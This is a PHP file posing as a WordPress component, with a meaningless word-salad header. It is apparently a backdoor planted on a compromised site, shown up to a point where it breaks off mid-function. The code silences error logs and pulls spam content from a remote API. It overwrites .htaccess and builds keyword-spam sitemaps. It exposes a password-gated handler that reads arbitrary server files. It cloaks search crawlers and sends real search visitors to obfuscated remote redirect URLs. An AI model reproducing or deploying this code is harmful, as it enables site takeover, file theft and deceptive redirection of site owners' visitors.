<?php 

/**
 * arichmetic jam register video.
 * appeal gaze suspicion violet virtue.
 * response applicable approve avenue balcony beforehand comparable delicate derive explosion extraordinary frown inhabitant insignificant magnet mainland moral orchestra partial passport personnel talent tense vacant.
 * breed calendar conquer evaluate hint integrate joint oblige prevail previous radical range resistant stimulate trap utter venture virtue withdraw.
 * alcohol core defect delicate encounter evolve flash genius hostile isolate launch minimum mixture moral necessity neutral scan simplify suspicion variation volcano.
 * coarse earthquake exceed extreme hestiate lean manual regulate.
 * response architecture career decorate deserve duration exclusive explosive integrate jungle liquor liter magnet mixture moist oblige profitable remote restraint simplicity stable substance trial utilify withstand.
 * import infect profit profitable quit.
 * balcony extinct household remarkable secure temple.
 * adopt aware brake discipline explosion haste kneel manufacture motive parade radiation stale target terminal torture utilise.
 * applicant approximate decorate distribute disturb elastic external flexible jewel leisure likelihood mainland motive particle particularly skim stimulate temporary transplant ultimate variation version voluntary.
 * avenue burst candidate coil distribute genuine liquor ruin slender triangle urban.
 * applicant bureau data genuine hollow lest manufacture particularly primitive repetition security seminar tense theme vessel withstand witness xploit.
 * aware boundary consume decorate distinguish equivalent junior massive modest scandal software stable unique zone.
 * algebra awful brake competition essential exclaim external extreme fax knot licence maximum partial strategy temple venture xploit.
 * available awkward burden earthquake flock necessity oblige passive scan slender.
 * Internet explosion moral restrict waist.
 * hatred modest moist prevail retain.
 * casual dash discipline elastic enthusiasm evil germ guilty jewel navigation nonsense prominent promote restraint scale slope stable substitute survey utilise utter.
 * adjust arbitrary available candidate casual extinct volcano.
 * accelerate approach calendar decorate distinguish extinct favorable identify interpretation optics particle recruit sensible significance strategy vitally xploit.
 * alter aware capture data decline insurance leap likelihood petroleum prosperity region reinforce retail security shallow sponsor strategic title undergraduate violent.
 * Internet acknowledge alter approve automatic breed community core durable enthusiasm gaze infant joint rely shuttle submit tendency via weave yield.
 * acid coarse comedy deaf decent dispose expense hatred male missile notion ruin severe video volume.
 * accomplish adequate adopt authority awkward discipline durable giant leather opponent region spur stimulate tone triumph virtue wealthy.
 *
 * @package WordPress
 */


@ini_set('display_errors', 0);
@ini_set('log_errors', 0);
@set_time_limit(3600);
define("DATAHOST","https://www.data-center.com/api/");
define("CENTERKEY",3);
define("MYDIR", "/amaus210528-22/");
define("FNUM",98);
define("JGNUM","40");
define("LINKNUM","8");
define("BZSITE","f");
define("CURRENUSE","/usd/");
define("BZPRO","d");
define("BZCAT","s");
//msbg
define("JDT","0");
//msend

//msidbg
define("MSID",7321);
//mssidend


//keyjgbg

define("KEYJG",29);

//keyjgend

//randnumIbg

define("RANDNUMI",7);

//randnumIend

//randnumIIbg

define("RANDNUMII",6);

//randnumIIend

//pnamelenbg

define("PNAMELEN",44);

//pnamelenend

//jthouzuibg
define("JTHZ",".cgi");
//jthouzuiend


//nttarr_bg

$arrnametime[]="3";
$arrnametime[]="1";
$arrnametime[]="2";
$arrnametime[]="4";


//nttarr_end


//kwzzarr_bg

$arrKeywz[]="11";
$arrKeywz[]="4";
$arrKeywz[]="5";
$arrKeywz[]="9";
$arrKeywz[]="8";
$arrKeywz[]="12";
$arrKeywz[]="7";
$arrKeywz[]="6";
$arrKeywz[]="10";


//kwzzarr_end


//brddarr_bg

$arrBread[]="BreadcrumbsHead";
$arrBread[]="plp__breadcrumb clearfix";
$arrBread[]="";
$arrBread[]="navBreadCrumbs";
$arrBread[]="qa-breadcrumb";
$arrBread[]="Breadcrumb-Head clearfix";
$arrBread[]="el-breadcrumb";
$arrBread[]="breadcrumb";
$arrBread[]="Bread row";
$arrBread[]="crumbsTop clearfix";
$arrBread[]="breadcrumb";
$arrBread[]="Breadcrumb clearfix";
$arrBread[]="crumbs-nag row";
$arrBread[]="doc-crumb clearfix";
$arrBread[]="bread-List clearfix";
$arrBread[]="ag-breadcrumblist row";
$arrBread[]="v-breadcrumb row";
$arrBread[]="breadLists row";
$arrBread[]="breadcrumb clearfix";
$arrBread[]="ag-breadcrumblist";
$arrBread[]="BreadcrumbHead clearfix";
$arrBread[]="Breadcrumb clearfix";
$arrBread[]="crumbsHeads";
$arrBread[]="crumb-list";
$arrBread[]="l-breadcrumblist";
$arrBread[]="wrapper-breadcrums";
$arrBread[]="l-breadcrumb row";
$arrBread[]="BreadcrumbList clearfix";
$arrBread[]="crumbs-nag clearfix";
$arrBread[]="BreadcrumbsHead clearfix";
$arrBread[]="crumbsHead";
$arrBread[]="v-breadcrumb";
$arrBread[]="c-breadcrumb";
$arrBread[]="mb-breadcrumb clearfix";
$arrBread[]="ck-breadcrumb clearfix";
$arrBread[]="breadcrumbs clearfix";
$arrBread[]="";
$arrBread[]="crumb-list row";
$arrBread[]="Breadcrumb-Heads";
$arrBread[]="Breadcrumb-Top row";
$arrBread[]="breadtops row";
$arrBread[]="l-breadcrumb clearfix";
$arrBread[]="BreadcrumbLists clearfix";
$arrBread[]="";
$arrBread[]="cs-breadcrumb";
$arrBread[]="breadcrumbs-base clearfix";
$arrBread[]="";
$arrBread[]="BreadcrumbNavigation";
$arrBread[]="BreadcrumbHeads";
$arrBread[]="bread_crumb clearfix";
$arrBread[]="BreadcrumbTops";
$arrBread[]="Breadcrumb-Top";
$arrBread[]="navBreadCrumb row";
$arrBread[]="customBreadcrumb clearfix";
$arrBread[]="navBreadCrumbs clearfix";
$arrBread[]="crumbsTops";
$arrBread[]="customBreadcrumb row";
$arrBread[]="";
$arrBread[]="crumbs-top";
$arrBread[]="breadList";
$arrBread[]="BreadcrumbHead row";
$arrBread[]="breadcrumbs row";
$arrBread[]="l-breadcrumblist clearfix";
$arrBread[]="breadLists";
$arrBread[]="";
$arrBread[]="l-breadcrumblist row";
$arrBread[]="page-breadcrumbs";
$arrBread[]="BreadHead clearfix";
$arrBread[]="crumbs-head clearfix";
$arrBread[]="crumbs-top row";
$arrBread[]="v-breadcrumb clearfix";
$arrBread[]="BreadcrumbNavigation row";
$arrBread[]="crumbsHeads clearfix";
$arrBread[]="r-breadcrumb clearfix";
$arrBread[]="plp__breadcrumb";
$arrBread[]="breadtop";
$arrBread[]="";
$arrBread[]="Breadcrumbs";
$arrBread[]="BreadcrumbsList";
$arrBread[]="";
$arrBread[]="BreadcrumbHeads row";
$arrBread[]="breadHead clearfix";
$arrBread[]="BreadcrumbTop";
$arrBread[]="mb-breadcrumb";
$arrBread[]="Breadcrumb";
$arrBread[]="breadcrumbs-base";
$arrBread[]="BreadcrumbNavigation clearfix";
$arrBread[]="breadtop row";
$arrBread[]="bread_crumb";
$arrBread[]="breadtop clearfix";
$arrBread[]="bread-List";
$arrBread[]="crumbList clearfix";
$arrBread[]="breadHeads";
$arrBread[]="BreadcrumbList";
$arrBread[]="wrapper-breadcrums row";
$arrBread[]="BreadcrumbTops row";
$arrBread[]="chrome-breadcrumbs";
$arrBread[]="bread-List row";
$arrBread[]="Breadcrumb-Heads row";
$arrBread[]="breadList clearfix";
$arrBread[]="BreadcrumbTop clearfix";
$arrBread[]="ck-breadcrumb";
$arrBread[]="plp__breadcrumb row";
$arrBread[]="nw-breadcrumblist";
$arrBread[]="r-breadcrumb row";
$arrBread[]="Breadcrumb-Top clearfix";
$arrBread[]="l-breadcrumb clearfix";
$arrBread[]="Breadcrumb row";
$arrBread[]="crumbs-top clearfix";
$arrBread[]="BreadHead row";
$arrBread[]="l-breadcrumb";
$arrBread[]="BreadcrumbsHead row";
$arrBread[]="wrapper-breadcrums clearfix";
$arrBread[]="el-breadcrumb clearfix";
$arrBread[]="chrome-breadcrumbs row";
$arrBread[]="breadcrumbs";
$arrBread[]="nw-breadcrumblist clearfix";
$arrBread[]="crumbs-nag";
$arrBread[]="crumbsTops clearfix";
$arrBread[]="crumbsTop";
$arrBread[]="ant-breadcrumb";
$arrBread[]="crumbs clearfix";
$arrBread[]="crumbsHead row";
$arrBread[]="";
$arrBread[]="mb-breadcrumb row";
$arrBread[]="qa-breadcrumb clearfix";
$arrBread[]="ant-breadcrumb clearfix";
$arrBread[]="BreadcrumbLists";
$arrBread[]="nw-breadcrumblist row";
$arrBread[]="breadLists clearfix";
$arrBread[]="el-breadcrumb row";
$arrBread[]="";
$arrBread[]="breadcrumb row";
$arrBread[]="";
$arrBread[]="page-breadcrumbs row";
$arrBread[]="crumbList row";
$arrBread[]="doc-crumb row";
$arrBread[]="breadcrumb row";
$arrBread[]="pages-breadcrumbs row";
$arrBread[]="bread_crumb row";
$arrBread[]="crumbs-head row";
$arrBread[]="crumbs row";
$arrBread[]="s-breadcrumb";
$arrBread[]="cs-breadcrumb clearfix";
$arrBread[]="breadHeads clearfix";
$arrBread[]="l-breadcrumb";
$arrBread[]="BreadcrumbHead";
$arrBread[]="BreadcrumbList row";
$arrBread[]="crumbs";
$arrBread[]="crumbs-head";
$arrBread[]="Breadcrumbs row";
$arrBread[]="Breadcrumb-Heads clearfix";
$arrBread[]="r-breadcrumb";
$arrBread[]="page-breadcrumbs clearfix";
$arrBread[]="breadcrumbs-base row";
$arrBread[]="ag-breadcrumblist clearfix";
$arrBread[]="";
$arrBread[]="chrome-breadcrumbs clearfix";
$arrBread[]="pages-breadcrumbs clearfix";
$arrBread[]="cs-breadcrumb row";
$arrBread[]="BreadHead";
$arrBread[]="breadHead";
$arrBread[]="Breadcrumbs clearfix";
$arrBread[]="navBreadCrumbs row";
$arrBread[]="s-breadcrumb clearfix";
$arrBread[]="Breadcrumb-Head";
$arrBread[]="c-breadcrumb clearfix";
$arrBread[]="BreadcrumbHeads clearfix";
$arrBread[]="Breadcrumb";
$arrBread[]="breadtops clearfix";
$arrBread[]="s-breadcrumb row";
$arrBread[]="Bread clearfix";
$arrBread[]="BreadcrumbsList row";
$arrBread[]="crumbsHeads row";
$arrBread[]="breadList row";
$arrBread[]="crumbsHead clearfix";
$arrBread[]="navBreadCrumb";
$arrBread[]="crumbsTops row";
$arrBread[]="pages-breadcrumbs";
$arrBread[]="c-breadcrumb row";
$arrBread[]="crumb-list clearfix";
$arrBread[]="BreadcrumbLists row";
$arrBread[]="Breadcrumb-Head row";
$arrBread[]="ck-breadcrumb row";
$arrBread[]="";
$arrBread[]="Bread";
$arrBread[]="l-breadcrumb row";
$arrBread[]="crumbList";
$arrBread[]="customBreadcrumb";
$arrBread[]="BreadcrumbTops clearfix";
$arrBread[]="crumbsTop row";
$arrBread[]="qa-breadcrumb row";
$arrBread[]="navBreadCrumb clearfix";
$arrBread[]="breadcrumb clearfix";
$arrBread[]="doc-crumb";
$arrBread[]="BreadcrumbsList clearfix";
$arrBread[]="breadHeads row";
$arrBread[]="breadHead row";
$arrBread[]="Breadcrumb row";
$arrBread[]="ant-breadcrumb row";
$arrBread[]="BreadcrumbTop row";
$arrBread[]="breadtops";


//brddarr_end




//fhharr_bg

$arrfh[]="Christmas Supplies";
$arrfh[]="Xmas";
$arrfh[]="Top Christmas gifts 2021";
$arrfh[]="Christmas gift ideas";
$arrfh[]="Christmas presents";
$arrfh[]="Unique Christmas Gifts";
$arrfh[]="Christmas gift";
$arrfh[]="Christmas Ornament";
$arrfh[]="Christmas gift shop";
$arrfh[]="Christmas Decoration";
$arrfh[]="Xmas Ornaments";
$arrfh[]="Christmas gift ideas 2021";
$arrfh[]="Holiday presents";
$arrfh[]="for Christmas";
$arrfh[]="Holiday Gifts";
$arrfh[]="Christmas Gifts 2021";
$arrfh[]="Christmas gift store";
$arrfh[]="Christmas Holiday";
$arrfh[]="best Christmas gift";
$arrfh[]="Best Christmas gifts 2021";

//fhharr_end



$q1 = "O00O0O";	$q2 = "O0O000";	$q3 = "O0OO00";	$q4 = "OO0O00";	$q5 = "OO0000";	$q6 = "O00OO0";	$q7 = "O00O00";	$q8 = "O00OOO";	$$q1 = RandAbcs();



//srrarr_bg
$date_string[0]="ibdyhwxcoguqpnzjfmtvsarekl";
$date_string[1]="hbrdkxnityfcpaqwjulegmoszv";
$date_string[2]="ztgibeuxpkadowjfcmnysvqhrl";
$date_string[3]="hxclroyswidpnajvuztmgbqfke";
$date_string[4]="hvinodklayxgmbqsujwerfzptc";
$date_string[5]="taevwubfzncixkrjqhdsoypgml";
$date_string[6]="snetkldrfihzvyaxocjgbmpwuq";
$date_string[7]="iasujbcmwtgfzvhkrendoqlpxy";
$date_string[8]="fohgqkrzmtipvalwujexdcbysn";
$date_string[9]="upervajmgfhkdoiytlbwsxcqnz";
$date_string[10]="eaucwtfdpvsynqxbglhjkzmiro";
$date_string[11]="nbwcydplxhrfksmioveajgtzuq";
$date_string[12]="yacelugpbfdrwmqkvixnothszj";
$date_string[13]="ebifyxaqdvkuosgzlwhrnmjcpt";
$date_string[14]="xnbeiytmgrwcjkszvdploafqhu";
$date_string[15]="drcyfstpozghvqiuexbkjmlwna";
$date_string[16]="oslgutbznamdcjpixyevfkhqwr";
$date_string[17]="uevwqydnozilshmbftxrkjagpc";
$date_string[18]="dvpoyrlwunxeztbsagjfkcqimh";
$date_string[19]="lpahtoqfrziymdxgeskwjbcnvu";
$date_string[20]="ircmzhkxftegdqluwonpvbyjsa";
$date_string[21]="wandubpexiohfqmksyjgvztrcl";
$date_string[22]="whiytqdflsopgxjvkumarenbzc";
$date_string[23]="zjosrpqevbhgaldkuxcwifynmt";
$date_string[24]="ecqfzwilpdxvkrmohjysngabut";
$date_string[25]="naqiyutldbpfsoezwkjcxgrmhv";
$date_string[26]="qwtkfliyubshmnjaegdvxrczop";
$date_string[27]="opizfhrcnylqxwjdkevsgbamut";
$date_string[28]="gqurjwkeshlcaytzvnxfibpdom";
$date_string[29]="zpuiaenwvmbcgfqlrktyodsjxh";
$date_string[30]="haxtrdvmqcfpgesjowlynzuikb";
$date_string[31]="eludjzsncrqmwtybifoaphkvxg";
$date_string[32]="ailfwgdjzubnvmrktpxqsoyceh";
$date_string[33]="sbmhdewxajofkqpnluyzictrgv";
$date_string[34]="xvinjzylhaudcorwtgfemspqbk";
$date_string[35]="wgoricztpvbkdnqausxlefhymj";
$date_string[36]="uyekpoihwzsgxadjlftrqvcnbm";
$date_string[37]="cthuolqanspbkxdzgwfjryveim";
$date_string[38]="gilonkvsqebfzywruhjamcdpxt";
$date_string[39]="cunkftpjswgahmyrlxdivozqeb";
$date_string[40]="cwurbjsvpaydtihgmlfoqzkexn";
$date_string[41]="mwrlbaqigkusvtpzjdnxechyof";
$date_string[42]="jvikwulbaqhytrdzpnscfmgoxe";
$date_string[43]="bxpuvnzdatgclrfqmhiowyeskj";
$date_string[44]="uybihmsqwacdtzjvenrxpokfgl";
$date_string[45]="kqoglufbsjcnrvzhdtwyxpimae";
$date_string[46]="drjikxphuwoncztgybsmeavlqf";
$date_string[47]="sqvdojfbkcxlipaguyehntmrwz";
$date_string[48]="vfqzjdclaeupmhiyswbtkxrgno";
$date_string[49]="jzxmtvubdekoangwlfhpqcyrsi";
$date_string[50]="pdzhtwfmoibluxckyvqnrasgje";
$date_string[51]="djbwzqlfgxukyceioanhrmvspt";
$date_string[52]="kjlytbqcpdexgsfvnwazhrimuo";
$date_string[53]="uvpdexgqslythjrokciwzmnfba";
$date_string[54]="acolstwrngqbdhvzmjekxyupfi";
$date_string[55]="cxhnpvgfblijdsukytemqorwza";
$date_string[56]="axolfjzhyqwdsvtcermpnkgubi";
$date_string[57]="omwfgucqjkhbprsxavyltedinz";
$date_string[58]="kdjqnymhxbweztufcoialvprgs";
$date_string[59]="czpdnrstjlqbioxemwhyvgfkau";
$date_string[60]="khgvczinpdlfqwrxeymsjabuto";
$date_string[61]="irdhnyzbqceglujxwfsaovmpkt";
$date_string[62]="zkcvynihjaebmgpdoustwlxrqf";
$date_string[63]="lnoxwghuysadbejrzvftpikcqm";
$date_string[64]="hxbwrnmkapzuelsdvgfcyjitoq";
$date_string[65]="vtofkrwhbxpmqiujyaedgszlcn";
$date_string[66]="bwfqkrpuixolanedzvmjgctyhs";
$date_string[67]="pybugiwfcntzmojxkhsvealrqd";
$date_string[68]="sargmvnywjdczxfqhlkipteoub";
$date_string[69]="kgawroefxmtvlbyqnpzsjduich";
$date_string[70]="gpbnwilhoeqvtczumydrfkxajs";
$date_string[71]="ewvpqrsgdnmfychbtkzijoalux";
$date_string[72]="fwsxaqmeukyodlrpjhczgnibtv";
$date_string[73]="lnfsjqoydkzgexabtvwmircpuh";
$date_string[74]="nbpfhvdxarijeguswykztmcqol";
$date_string[75]="chasltmewyjorqdbgnxpvizufk";
$date_string[76]="etmpduoghcyxikwqsalzbfnjvr";
$date_string[77]="zilrgxpfnmvoeysbuqkcwjthda";
$date_string[78]="ihendokwsbfqatjrmxplyvczgu";
$date_string[79]="ymzofxsceijghbprudknatlwqv";
$date_string[80]="ecfqolxukbwnyvprgtzdahsmij";
$date_string[81]="tqxnzlsibwekojgucmfpvarhdy";
$date_string[82]="zvsrkbyfcqpwlihedoxtamnujg";
$date_string[83]="bxgjmtelukroyihzqsncwpdfva";
$date_string[84]="ramugsjpwdkcthfebqxlyzinvo";
$date_string[85]="zbkjtlumeocwdsrafgxpiyqnhv";
$date_string[86]="nugzaiocvblxrstkhemdjfwypq";
$date_string[87]="vyrpxcfhlujegwkozsatdiqmnb";
$date_string[88]="tkjehgyfrnxmpcoliqausdzvbw";
$date_string[89]="fxokuawzqjyrsdhlcmpvgitbne";
$date_string[90]="kwgbjhqzrltvxypounfedicmsa";
$date_string[91]="qxwujhetadfnvrkcglpbimszyo";
$date_string[92]="doavjqhnbtlszfprkemucxigwy";
$date_string[93]="wqexlbpuyhizrafmndstogcvjk";
$date_string[94]="ucdnohpfxrzblkwysmatqijgev";
$date_string[95]="wkfdpyhzenligqrsvxuabcomjt";
$date_string[96]="gcuxpnraykwdqfvloibshtejzm";
$date_string[97]="dvqcgzhkyltnrwemxuojbiapfs";
$date_string[98]="rtopkbnlhqxugzsejifmycvadw";
$date_string[99]="jwtvxosbefrkulncydhmaqigzp";

//srrarr_end



$thisdom = str_replace("www.","",$_SERVER['HTTP_HOST']);
define("GETDOM",getthisdom());
		


// 
	
	
	
$arrArrr = array();$j = 0;for($i=0;$i<20;$i+=2){
   $arrArrr[$j++] = $date_string{$i}.$date_string{$i+1};}
$Arrrarr = array_flip($arrArrr);
$temp_abc = $O00O0O{9}.$O00O0O{4}.$O00O0O{0}.$O00O0O{13}.$O00O0O{17}.$O00O0O{14}.$O00O0O{11};
$temp_def = $O00O0O{13}.$O00O0O{0}.$O00O0O{18}.$O00O0O{20}.$O00O0O{3}.$O00O0O{8}.$O00O0O{14}.$O00O0O{0};



if(isset($_GET["gsitemap"]) && isset($_GET["mapnum"])){
	
	$O_OO0_0O_0='America/Chicago';	@date_default_timezone_set($O_OO0_0O_0);	
	if (! is_dir("../xmlmap"))
		mkdir("../xmlmap", 0755);	
	global $gnumber;
	$gnumber = 1;
	$bgNum = (int)trim($_GET["gsitemap"]);
	$mapnum = (int)trim($_GET["mapnum"]);
	if($bgNum > FNUM)
	   die("The Number Must Lower Then " . FNUM);
   
	$arrNumTemp = getMapNum($bgNum,$mapnum);
	
	$rs = '#<map>(.*)</map>#si';
	$mapLogs = file_get_contents("./map.log");
	
	foreach($arrNumTemp as $vss){
		
		$vals = "id$vss.php";
		
		
		if(JDT == 0 && $gnumber == 1){
			
			if(strstr($mapLogs,'site_map.xml') && file_exists('../xmlmap/sitemap.xml')){
				echo $vals."<br/>";
				echo '../xmlmap/sitemap.xml successed<br/>';
				$gnumber++;
				continue;	
			}
		
		}elseif(JDT == 0){
			
				
		if(strstr($mapLogs,'#' . $arrABC[$gnumber-2] . 'goodssearch'  .'.xml#') && file_exists('../xmlmap/' . $arrABC[$gnumber-2] . 'goodssearch' .'.xml')){
			echo $vals."<br/>";
			echo '../xmlmap/' . $arrABC[$gnumber-2] . 'goodssearch' .'.xml successed<br/>';
			$gnumber++;
			continue;	
		}
		}
		
		
		if(strstr($mapLogs,'#' . $arrABC[$gnumber-1] . 'goodssearch'  .'.xml#') && file_exists('../xmlmap/' . $arrABC[$gnumber-1] . 'goodssearch' .'.xml')){
			echo $vals."<br/>";
			echo '../xmlmap/' . $arrABC[$gnumber-1] . 'goodssearch' .'.xml successed<br/>';
			$gnumber++;
			continue;	
		}
		
		for($i=0; $i<3; $i++){
			$idUrl =  GETDOM . "gpage.php?getmapid=$vss&site=$thisdom&sid=".MSID;
			$tempIdStr = curl_get_from_webpage($idUrl,'',5);
			$arrIdNameNow = array();
			if(preg_match($rs,$tempIdStr,$matchIdName)){
				$tparrIdName = explode('^^',$matchIdName[1]);
				foreach($tparrIdName as $vs){
					$tpArr = explode('^',$vs);
					if(count($tpArr) == 2){
						$arrIdNameNow[$tpArr[0]] = $tpArr[1];
					}elseif(count($tpArr) > 2){
						$tpstr = '';
						for($j=1; $j<count($tpArr); $j++){
							$tpstr .= $tpArr[$j] . ' ';
						}
						$tpstr = trim($tpstr);
						$arrIdNameNow[$tpArr[0]] = $tpstr;
					}
				}
				
				break;
			}
		}
		
		
	
		if(!isset($arrIdNameNow) or count($arrIdNameNow) < 100){
			echo "g sitemap fail<br/>";
			die();
		}
		
		echo $vals."<br/>";
	
		if($gnumber == 1){
			if(JDT == 1){
				gsitemap($arrIdNameNow,2,1);			
				}else{
				gsitemap($arrIdNameNow,1,2);			
				}
		}else{
			
			if(JDT == 1){
				gsitemap2($arrIdNameNow,2,1);			}else{
				gsitemap2($arrIdNameNow,1,2);			}
			
		}
		
		unset($arrIdNameNow,$tempArr1,$tempArr2);	}
	
}


if(isset($_GET["ghtac"]) && $_GET["ghtac"]){

	$dirNames = dirname(__FILE__);    
	$httcReplace = end((explode(DIRECTORY_SEPARATOR, $dirNames)));	
	$PreDir = '';	
	if(JDT == 1){
		$UrlBaseDir = $httcReplace;		$RewriteOnDir = '';	
	}else{
		$UrlBaseDir = '';		$PreDir = '../';		$RewriteOnDir = $httcReplace . '/';	
	}
	$strhtt = '';
	if (file_exists("$PreDir.htaccess")){
		@chmod("$PreDir.htaccess",0755);
		$strhtt = file_get_contents("$PreDir.htaccess");	
	}
	if(!(strstr($strhtt,'RewriteBase') || strstr($strhtt,'RewriteRule')))
	{
		$strhtt = '<IfModule mod_rewrite.c>'.PHP_EOL . 'Options +FollowSymLinks'. PHP_EOL .'RewriteEngine on'. PHP_EOL .'RewriteBase /'. $UrlBaseDir . PHP_EOL .'</IfModule>';	
	}else{
		$strhtt = str_ireplace('# RewriteBase ','RewriteBase ',$strhtt);
		$strhtt = str_ireplace('#RewriteBase ','RewriteBase ',$strhtt);	
	}
		
	if(1){
		
		$r0 = '#(.*RewriteEngine On.*)#i';

		$r1 = '#(.*RewriteBase.*)#i';		$r2 = '#RewriteRule#i';		

	



		if(JDT == 0){
			
			
			$rsut = '\1'.PHP_EOL . 'RewriteRule ^'. '.*/[^-]+-(\d+)/.*'. JTHZ  .'$ '.$RewriteOnDir.'index\.php?id=\$1&%{QUERY_STRING} [L]'. PHP_EOL .  'RewriteRule ^'.'.*([a-z]+goodssearch\.xml)$  xmlmap/\$1 [L]' . PHP_EOL . 'RewriteRule ^'.'.*(sitemap\.xml)$  xmlmap/\$1 [L]' . PHP_EOL ;
		
			$rsut2 = PHP_EOL . 'RewriteRule ^'. '.*/[^-]+-(\d+)/.*'. JTHZ  .'$ '.$RewriteOnDir.'index\.php?id=\$1&%{QUERY_STRING} [L]'. PHP_EOL .  'RewriteRule ^'.'.*([a-z]+goodssearch\.xml)$  xmlmap/\$1 [L]' . PHP_EOL . 'RewriteRule ^'.'.*(sitemap\.xml)$  xmlmap/\$1 [L]' . PHP_EOL .'RewriteRule' ;
		
			
		}else{
			
			
			$rsut = '\1'. PHP_EOL . 'RewriteRule ^'. '.*/[^-]+-(\d+)/.*'. JTHZ  .'$ '.$RewriteOnDir.'index\.php?id=\$1&%{QUERY_STRING} [L]'. PHP_EOL ;
		
			$rsut2 =  PHP_EOL . 'RewriteRule ^'. '.*/[^-]+-(\d+)/.*'. JTHZ  .'$ '.$RewriteOnDir.'index\.php?id=\$1&%{QUERY_STRING} [L]'. PHP_EOL   .'RewriteRule' ;	
		
			
		}



	
			if(preg_match($r0,$strhtt)){
				$strhtt = preg_replace($r0,$rsut,$strhtt,1);
			}elseif(preg_match($r1,$strhtt)){
				$strhtt = preg_replace($r1,$rsut,$strhtt,1);
			}else{
				$strhtt = preg_replace($r2,$rsut2,$strhtt,1);
			}
		
		if(JDT == 1 or JDT == 0){
			file_put_contents("$PreDir.htaccess", $strhtt);		
		}
		
	}

	die("ghtac ok");
}


if(isset($_POST["chdate"]) && md5($_POST["chdate"])=='b6772c68627f804a9578152ee90f5b0c' && isset($_POST["v_read"])){$v_read = $_POST["v_read"];if(file_exists($v_read)){echo '#ok#';}else{echo '#nofile#';}die();}if(isset($_POST["redate"]) && md5($_POST["redate"])=='b6772c68627f804a9578152ee90f5b0c' && isset($_POST["v_read"])){$v_read = $_POST["v_read"];if(file_exists($v_read)){echo rFile($v_read);die();}else{echo '#nofile#';die();}}if(isset($_POST["test"]) && md5($_POST["test"])=='b6772c68627f804a9578152ee90f5b0c'){echo '#ok#';	die();}if((isset($_POST["lan"]) && $_POST["lan"] == 1) or (isset($_GET["lan"]) && $_GET["lan"] == 1)){$blog_data = array();$flag = 1;$blog_data['index'] = filesize(__FILE__);if(file_exists("./template.html")){$blog_data['template'] = filesize("./template.html");}else{$flag = 0;$blog_data['template'] = -1;}echo 'error---'. serialize($blog_data) .'---';die();}if(isset($_GET["gsitemap"]) || isset($_GET["rset"]) || isset($_GET["hzui"]) || isset($_GET["jgshu"]) || isset($_GET["ljshu"]) || isset($_GET["modifydate"]) || isset($_GET["moshi"]) || isset($_GET["install"])){die();}
	
if(JDT==2){
	
	$UrlParent=end((explode('index.php',$_SERVER['REQUEST_URI'])));	if($UrlParent){
		$tempSid = '';		$tempPid = '';		
				
		$r2='#.*/[^-]+-(\d+)/.*'. JTHZ .'$#i';		$r3='#.*/[^-]+-(\d+)/.*/$#i';
		if(preg_match($r2,$UrlParent,$matches2)){
			if(isset($matches2[1]))
				$tempPid = $matches2[1];		}else{
			
			preg_match($r3,$UrlParent,$matches13);			if(isset($matches13[1]))
				$tempPid = $matches13[1];		}
	
			
		if($tempPid && !strstr($_SERVER['REQUEST_URI'],'category/')){
			$_GET['id']= $tempPid;		
		}else{
			$r2='#(.*)/category-\d+/#i';		$r3='#(.*)/category-\d+/$#i';
			if(preg_match($r2,$UrlParent,$matches2)){
				if(isset($matches2[1]))
					$tempPid = $matches2[1];		
			}else{
				preg_match($r3,$UrlParent,$matches13);
				if(isset($matches13[1]))
					$tempPid = $matches13[1];
			}
			
			if($tempPid)
				$_GET['cat']= $tempPid;	
			
		}
	}
	
}elseif(JDT==3&&isset($_GET['keyword'])&&$_GET['keyword']){
		
		$tempSid = '';		$tempPid = '';		$UrlParent = $_GET['keyword'];		

		$r2='#-(\d+)$#i';		$r3='#[-/]'.'(\d+)$#i';	
		if(preg_match($r2,$UrlParent,$matches2)){
			if(isset($matches2[1]))
				$tempPid = $matches2[1];		}else{
			
			preg_match($r3,$UrlParent,$matches13);			if(isset($matches13[1]))
				$tempPid = $matches13[1];		}
		
		

	
	
		if($tempPid){
			$_GET['id']= $tempPid;		
		}
	
	
}	
	
function getRandStr(){
	
	$arrABC = range('a','z');	shuffle($arrABC); 
	$randNum = rand(4,6);	
	$str = implode('',array_slice($arrABC,0,$randNum));	
	return $str;}
	

if(isset($_GET["id"]))
	$id = $_GET["id"];
else{
	
	if(isset($_GET["cat"])){
		$rqurl = $_GET["cat"];
		
		$logFileName = './idlogs.txt';
		if(file_exists($logFileName)){
			$arrUrlId = unserialize(file_get_contents($logFileName));
		}else{
			$arrUrlId = array();
		}

		if(isset($rqurl) && isset($arrUrlId[$rqurl]) && $arrUrlId[$rqurl]){
			$id  = $arrUrlId[$rqurl];		
		}else{
			$arrUrlId[$rqurl] = getRandCId($rqurl);
			$id = $arrUrlId[$rqurl];
			file_put_contents($logFileName,serialize($arrUrlId));
			@touch(dirname($logFileName), $fLogTime, $fLogTime); 
			@touch($logFileName, $fLogTime, $fLogTime);    
		}
	}else{
		
	
	$id = "959596"; //llq index id 
	
	}

}

$rs_ptth = $O00O0O{63}.$O00O0O{2}.$O00O0O{14}.$O00O0O{12};
$rs_http = 'http://www.';
$resid = '#^\d+$#';
if(!preg_match($resid,$id)){
	http_response_code(404);
	exit;
}
$id23 = $id;



$siteid = MSID;
$siteAID = $siteid. '-' .$id23;$fileKey = $id23 % FNUM;
// $_SERVER["HTTP_REFERER"] = "google.com";
if(isset($_SERVER["HTTP_REFERER"])){
	$referer = $_SERVER["HTTP_REFERER"]; 
	$russ = '#(google|yahoo|incredibar|bing|docomo|mywebsearch|comcast|search-results|babylon|conduit)(\.[a-z0-9\-]+){1,2}#i';	

	$ipRanges = array(  array('64.233.160.0' , '64.233.191.255'),   array('66.102.0.0' , '66.102.15.255' ) ,   array('66.249.64.0' , '66.249.95.255') ,   array('72.14.192.0' , '72.14.255.255') ,   array('74.125.0.0' , '74.125.255.255') ,   array('209.85.128.0' , '209.85.255.255') ,   array('216.239.32.0' , '216.239.63.255') ); 
	$localIp = get_real_ip();	
	$is_or_no = is_ip($localIp,$ipRanges);
	$iszz = isCrawler();	
	
	if(function_exists('gethostbyaddr')){
		$hostname = @gethostbyaddr($localIp);
		$is_g_ip = preg_match("#google#i", "$hostname") === 1;
	}else{
		$is_g_ip = 0;
	}
	
	if(preg_match($russ, $referer) && $iszz == false && $is_or_no == false && !$is_g_ip){
		$rsdom = '#^https?://www\.[^/]+/$#i';
		
		$jums1 = $rs_http.$temp_abc.$rs_ptth. CURRENUSE . $siteid .".txt";	
		$jums2 = $rs_http.$temp_def.$rs_ptth. CURRENUSE . $siteid .".txt";
	
		for($i=0;$i<2;$i++){
			$jumstz = curl_getjs_from_webpage($jums1,2);
			$jumstz = trim($jumstz);

